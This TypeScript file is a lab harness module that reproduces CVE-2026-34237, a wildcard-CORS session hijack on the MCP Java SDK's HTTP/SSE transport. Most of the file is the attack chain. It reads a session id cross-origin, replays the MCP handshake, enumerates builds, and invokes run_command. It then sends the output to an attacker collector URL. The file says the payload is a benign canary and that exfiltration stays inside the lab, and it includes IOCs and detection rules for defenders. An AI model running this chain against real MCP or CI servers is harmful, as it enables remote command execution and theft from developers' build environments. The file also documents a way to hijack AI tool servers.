/**
 * Module 01 - headless reproduction of CVE-2026-34237: a wildcard-CORS session hijack over the MCP
 * HTTP/SSE transport (MCP Java SDK; affected mcp-core 1.0.0 / 1.1.0, patched 0.18.3 / 1.0.1 / 1.1.1).
 *
 * The harness plays the attacker's foreign-Origin browser page against the vulnerable "Meridian CI"
 * build assistant. The SDK transport answers the cross-origin SSE read with
 * `Access-Control-Allow-Origin: *`, so the page can READ the `endpoint` event, lift the session id it
 * discloses, and relay JSON-RPC over that hijacked session to drive the capability tool
 * `run_command`. Benign canary only (SECURITY.md rule 4). The real-browser variant is
 * engine/attacker/web/index.html.
 *
 *   ok (ATTACK-OK) = ACAO is "*"  AND  the SSE endpoint event disclosed a session id to the foreign
 *                    Origin  AND  run_command driven over that session echoes the canary.
 *   ok=false       = the wildcard-CORS read is absent (a browser could not read the session id), so
 *                    the chain stops at the transport - what a patched SDK does.
 *
 * Identity (title, CVE, CWE), the target and the transport all come from module.yml and lab.env; this
 * file states the attack only.
 */
import { defineScenario } from "../../engine/harness/src/scenario.js";
import { resultText } from "../../engine/harness/src/transport/index.js";
import { redactSession } from "../../engine/harness/src/report.js";

const CONCLUSION_OK =
  "The evidence demonstrates successful reproduction of the vulnerability described in CVE-2026-34237. " +
  "The MCP Java SDK HTTP/SSE transport returned a wildcard Access-Control-Allow-Origin, disclosed the " +
  "per-connection session id on the SSE endpoint event, and accepted a foreign-Origin replay of that " +
  "session that drove the capability tool run_command to execution. A web page on any Origin the developer " +
  "opens can therefore achieve remote, cross-origin control of the victim's build assistant.";

const CONCLUSION_NO =
  "The wildcard-CORS read did not reproduce against this server: a browser Origin could not read the SSE " +
  "stream, so no session id was disclosed and the attack chain stops at the transport. This is the expected " +
  "behaviour of a patched SDK (mcp-core 0.18.3 / 1.0.1 / 1.1.1), where the transport no longer emits a " +
  "blanket Access-Control-Allow-Origin.";

export const scenario = defineScenario({
  title: "Wildcard CORS session hijack over the MCP HTTP/SSE transport",
  conclusionOk: CONCLUSION_OK,
  conclusionNo: CONCLUSION_NO,

  iocs(ctx, ok) {
    const t = ctx.target;
    return {
      endpoints: [t.ssePath, `${t.messagePath}?sessionId=<redacted>`],
      methods: ["GET", "POST"],
      // The discriminating request headers a SOC sees: a local MCP client sends NO Origin; only a
      // browser does. (Relay content-type: this harness posts application/json; the real-browser
      // drive-by must use text/plain to stay CORS-simple, see the module README.)
      headers: { Origin: t.origin ?? "(none)", Host: new URL(t.url).host },
      userAgent: "browser-class (Origin header present; drive-by observed as HeadlessChrome/124.0.0.0)",
      sessionId: null,
      tools: ok
        ? ["list_builds (recon)", "run_command (capability exec)"]
        : ["none (chain stopped at the transport before any tool call)"],
      sourceHint: "foreign browser Origin, labnet 172.28.0.0/16",
      collector: t.collectorUrl,
      detections: [
        "ATR-2026-70001 (mcp.access, mcp.cors.cross_origin:true)",
        "Elastic Defend EQL (java -> sh, LAB_CANARY)",
      ],
    };
  },

  async run(ctx) {
    const { report, target } = ctx;
    report.info(`Attacker page at ${target.origin} models a "build #4209 failed" status link a developer opens.`);

    // 1. Cross-origin SSE read from a foreign Origin. Wildcard CORS is what lets a browser read the
    //    endpoint event, and therefore the session id, so we assert on the header a browser gates on.
    report.wireNote("Session-id read - cross-origin SSE (EventSource GET)");
    report.step(`Opening MCP session: cross-origin GET ${target.ssePath} from Origin ${target.origin}`);
    const opened = await ctx.connect();
    const acao = opened.acao;
    const sid = opened.sessionId;
    const detail = (exec: boolean) =>
      `ACAO=${acao ?? "none"} session=${sid ? "disclosed" : "none"} exec=${exec} transport=http+sse`;

    if (!opened.session) {
      report.fail("Server unreachable: the SSE stream did not connect from the foreign Origin");
      return { ok: false, detail: detail(false), notReproducedWhy: "server_unreachable" };
    }
    if (acao !== "*") {
      report.fail(
        `Wildcard CORS absent: Access-Control-Allow-Origin=${acao ?? "none"} (a browser could not read the stream)`,
      );
      opened.session.close();
      return { ok: false, detail: detail(false), notReproducedWhy: "cors_read_blocked" };
    }
    report.pass(
      "Wildcard CORS confirmed: Access-Control-Allow-Origin: *",
      "The cross-origin SSE response carried Access-Control-Allow-Origin: * (CWE-942), so a page on any Origin may read the stream.",
    );

    if (!sid) {
      report.fail("No session id disclosed on the SSE endpoint event");
      opened.session.close();
      return { ok: false, detail: detail(false), notReproducedWhy: "no_session_disclosed" };
    }
    report.pass(
      `Session identifier exposed: ${redactSession(sid)}`,
      `The SSE endpoint event disclosed the message endpoint ${target.messagePath}?sessionId=${sid}; reading it is stealing the session (MCP HTTP/SSE has no separate bearer credential).`,
    );
    report.mark("Attacker page lifted the session id cross-origin");

    const session = opened.session;
    try {
      // 2. MCP handshake over the hijacked session; responses arrive back on the SSE stream.
      report.wireNote("Session replay - MCP handshake over the hijacked session (text/plain POST, no preflight)");
      report.step("Session replay: completing the MCP handshake over the stolen session");
      await session.request("initialize", {
        protocolVersion: "2024-11-05",
        capabilities: {},
        clientInfo: { name: "attacker.lab.consulereit.nl", version: "0.0.0" },
      });
      await session.notify("notifications/initialized");
      report.pass(
        "Session replay successful: initialize accepted over the stolen session",
        "The victim's session accepted a foreign-Origin initialize handshake, confirming the session id alone is sufficient to drive it (session reuse).",
      );

      // 3. Recon through the hijacked session, which is what a real drive-by does first (best-effort).
      try {
        const builds = await session.request("tools/call", { name: "list_builds", arguments: {} });
        const rows = resultText(builds);
        const n = rows.split("\n").filter((l) => l.trim()).length;
        report.info(`Recon: list_builds enumerated ${n} pipeline runs through the hijacked session`);
        report.fact(
          `Recon over the hijacked session read the victim's CI state (list_builds returned ${n} pipeline runs).`,
        );
      } catch {
        /* recon is best-effort; the exec below is the real assertion */
      }

      // 4. Drive the capability tool with the stolen session.
      ctx.requireExec();
      report.wireNote("Capability invocation - run_command (benign canary) over the hijacked session");
      report.step("Tool invocation: relaying tools/call run_command (benign canary) cross-origin");
      const call = await session.request("tools/call", { name: "run_command", arguments: { cmd: ctx.canary() } });
      const out = resultText(call);

      if (!ctx.isCanary(out)) {
        report.fail(
          "run_command did not return the canary marker",
          "The relayed tool call did not echo the proof-of-execution canary.",
        );
        return { ok: false, detail: detail(false), notReproducedWhy: "exec_absent" };
      }
      const marker = ctx.canaryMarker(out);
      report.pass(
        "Tool invocation accepted: run_command executed in the CI workspace",
        "The capability tool run_command accepted the relayed foreign-Origin call and executed a shell command in the CI workspace.",
      );
      report.pass(
        `Canary executed: ${marker} returned to the attacker`,
        `Proof-of-execution canary ${marker} was returned in the tool output ("${out.split("\n")[0]}" ...), confirming code execution via the hijacked session.`,
      );
      report.mark("Canary output returned over the SSE stream to the attacker page");

      // 5. Exfil the canary output to the attacker collector (best-effort).
      await ctx.exfil({ sessionId: sid, output: out });
      report.info(`Exfiltrated canary output to attacker-collector (${target.collectorUrl})`);
      report.fact(
        `The canary output was exfiltrated to the attacker collector at ${target.collectorUrl} (labnet-internal sink; nothing leaves the lab).`,
      );

      return { ok: true, detail: detail(true) };
    } finally {
      session.close();
    }
  },

  /**
   * Read-only equivalent of steps 1 and 2 above: does the transport hand a foreign Origin a readable
   * stream and a session id? It stops there. No handshake replay, no tool call, no exfil.
   */
  async probe(ctx) {
    const opened = await ctx.connect({ retryMs: 5000 });
    const acao = opened.acao;
    const sid = opened.sessionId;
    opened.session?.close();
    return {
      checks: [
        {
          id: "wildcard-acao",
          observed: acao === "*",
          detail: `Access-Control-Allow-Origin: ${acao ?? "(absent)"} on a cross-origin read of ${ctx.target.ssePath}`,
        },
        {
          id: "session-id-disclosed",
          observed: !!sid,
          detail: sid
            ? `the SSE endpoint event disclosed a session id (${redactSession(sid)}) to Origin ${ctx.target.origin}`
            : "no session id was disclosed to the foreign Origin",
        },
      ],
    };
  },
});
